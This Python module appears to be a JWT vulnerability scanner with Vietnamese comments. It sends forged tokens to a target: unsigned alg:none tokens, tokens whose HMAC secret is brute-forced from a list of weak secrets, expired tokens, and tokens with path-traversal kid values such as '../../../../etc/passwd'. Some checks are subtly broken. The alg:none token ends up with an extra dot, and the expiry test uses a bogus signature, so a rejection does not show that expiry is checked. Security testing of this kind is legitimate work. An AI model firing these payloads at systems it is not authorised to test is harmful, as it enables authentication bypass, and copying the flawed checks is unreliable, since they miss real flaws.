"""
JWT Security Testing — theo đặc tả v3.1 §19.4 (Feature List #78).

- alg:none Attack: kiểm tra server chấp nhận token không chữ ký
- Weak Secret Brute Force: thử danh sách secret yếu phổ biến
- Expiration/Audience/Issuer Validation
- Signature Bypass & Kid Injection
"""
import base64
import hashlib
import hmac
import json
import time


class JWTScanner:
    """Quét lỗ hổng JWT (JSON Web Token)."""

    # Danh sách weak secret phổ biến (Phase 1 — có giới hạn để tránh brute-force mạnh)
    WEAK_SECRETS = [
        'secret', 'password', '123456', '12345678', 'qwerty', 'abc123',
        'admin', 'letmein', 'welcome', 'monkey', 'football', 'secret_key',
        'jwt_secret', 'mysecret', 'token', 'key', 'test', 'changeme',
        '1234567890', 'jwt', 'server', 'sql', 'root', 'toor', 'admin123',
    ]

    # Phương thức cần test
    TESTS = ['alg_none', 'weak_secret', 'exp_validation', 'kid_injection']

    def __init__(self, request_handler, jwt_token=None, jwt_header=None):
        self.request_handler = request_handler
        self.jwt_token = jwt_token
        self.jwt_header = jwt_header  # VD: {'Authorization': 'Bearer <token>'}
        self.findings = []

    def decode_token(self, token):
        """Giải mã JWT trả về header + payload."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None, None, None
            header = json.loads(self._b64decode(parts[0]))
            payload = json.loads(self._b64decode(parts[1]))
            return header, payload, parts
        except Exception:
            return None, None, None

    @staticmethod
    def _b64decode(data):
        """Decode base64url."""
        padding = '=' * (4 - len(data) % 4)
        return base64.urlsafe_b64decode(data + padding).decode('utf-8', errors='ignore')

    def build_token(self, header, payload, secret=None, signature=None):
        """Xây dựng JWT token."""
        def b64encode(data):
            return base64.urlsafe_b64encode(
                json.dumps(data, separators=(',', ':')).encode()
            ).rstrip(b'=').decode()

        header_enc = b64encode(header)
        payload_enc = b64encode(payload)

        if signature:
            sig = signature
        elif secret is not None:
            signing_input = f"{header_enc}.{payload_enc}"
            sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
            ).rstrip(b'=').decode()
        else:
            sig = ''

        return f"{header_enc}.{payload_enc}.{sig}"

    # ─── Test 1: alg:none ─────────────────────────────────────
    def test_alg_none(self, original_header, original_payload):
        """Kiểm tra server chấp nhận token không chữ ký (alg:none)."""
        findings = []
        for alg in ['none', 'None', 'NONE']:
            header = dict(original_header)
            header['alg'] = alg
            token = self.build_token(header, original_payload)
            token += '.'
            headers = self._make_headers(token)

            if self.request_handler:
                try:
                    resp = self.request_handler.send_request('GET', self.jwt_header.get('url', ''), headers=headers)
                    # Nếu server chấp nhận → không phải 401
                    if getattr(resp, 'status_code', 401) == 401:
                        continue
                    findings.append({
                        'type': 'JWT alg:none',
                        'severity': 'High',
                        'detail': f"Server chấp nhận token alg:{alg} không có chữ ký — attacker có thể tự tạo token",
                        'confidence': 'High',
                        'payload': token[:100],
                    })
                except Exception:
                    continue
        return findings

    # ─── Test 2: Weak Secret ──────────────────────────────────
    def test_weak_secret(self, original_header, original_payload, original_parts):
        """Kiểm tra secret yếu bằng cách brute-force chữ ký đã có."""
        if len(original_parts) != 3:
            return []

        header_enc, payload_enc, sig = original_parts
        signing_input = f"{header_enc}.{payload_enc}"

        for secret in self.WEAK_SECRETS:
            computed = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
            ).rstrip(b'=').decode()

            if hmac.compare_digest(computed, sig):
                return [{
                    'type': 'JWT Weak Secret',
                    'severity': 'High',
                    'detail': f"JWT secret quá yếu: '{secret}' — attacker có thể forge token",
                    'confidence': 'High',
                    'payload': secret,
                }]
        return []

    # ─── Test 3: Expiration Validation ────────────────────────
    def test_exp_validation(self, original_header, original_payload):
        """Kiểm tra server có validate claim exp không."""
        payload = dict(original_payload)
        payload['exp'] = int(time.time()) - 3600  # hết hạn 1 giờ trước

        token = self.build_token(original_header, payload, signature='expired')
        if self.request_handler:
            try:
                resp = self.request_handler.send_request('GET', self.jwt_header.get('url', ''), headers=self._make_headers(token))
                if getattr(resp, 'status_code', 401) == 401:
                    return []  # Server validate exp đúng
                return [{
                    'type': 'JWT Expiration Bypass',
                    'severity': 'Medium',
                    'detail': 'Server không validate claim exp — token hết hạn vẫn được chấp nhận',
                    'confidence': 'Medium',
                }]
            except Exception:
                return []
        return []

    # ─── Test 4: Kid Injection ────────────────────────────────
    def test_kid_injection(self, original_header, original_payload):
        """Kiểm tra lỗ hổng path traversal qua header kid."""
        findings = []
        kid_payloads = [
            '../../../../dev/null',
            '/dev/null',
            '..%2F..%2F..%2Fdev%2Fnull',
            ' ../../../../etc/passwd',
        ]

        for kid in kid_payloads:
            header = dict(original_header)
            header['kid'] = kid
            token = self.build_token(header, original_payload, secret='x')
            if self.request_handler:
                try:
                    resp = self.request_handler.send_request('GET', self.jwt_header.get('url', ''), headers=self._make_headers(token))
                    if getattr(resp, 'status_code', 401) == 401:
                        continue
                    findings.append({
                        'type': 'JWT Kid Injection',
                        'severity': 'High',
                        'detail': f"Header 'kid' có thể bị path traversal: '{kid}'",
                        'confidence': 'Medium',
                    })
                except Exception:
                    continue
        return findings

    # ─── Helpers ──────────────────────────────────────────────
    def _make_headers(self, token):
        headers = {'Authorization': f'Bearer {token}'}
        if self.jwt_header:
            # Giữ nguyên các header khác nếu có
            for k, v in self.jwt_header.items():
                if k.lower() not in ('authorization', 'url'):
                    headers[k] = v
        return headers

    def scan(self):
        """Chạy toàn bộ JWT scan."""
        if not self.jwt_token:
            return {'vulnerabilities': [], 'note': 'Không có JWT token để test'}

        header, payload, parts = self.decode_token(self.jwt_token)
        if not header:
            return {'vulnerabilities': [], 'note': 'Token không phải JWT hợp lệ'}

        all_findings = []

        # 1. alg:none
        if 'alg_none' in self.TESTS:
            all_findings.extend(self.test_alg_none(header, payload))

        # 2. Weak secret
        if 'weak_secret' in self.TESTS and parts:
            all_findings.extend(self.test_weak_secret(header, payload, parts))

        # 3. Exp validation
        if 'exp_validation' in self.TESTS:
            all_findings.extend(self.test_exp_validation(header, payload))

        # 4. Kid injection
        if 'kid_injection' in self.TESTS:
            all_findings.extend(self.test_kid_injection(header, payload))

        return {'vulnerabilities': all_findings}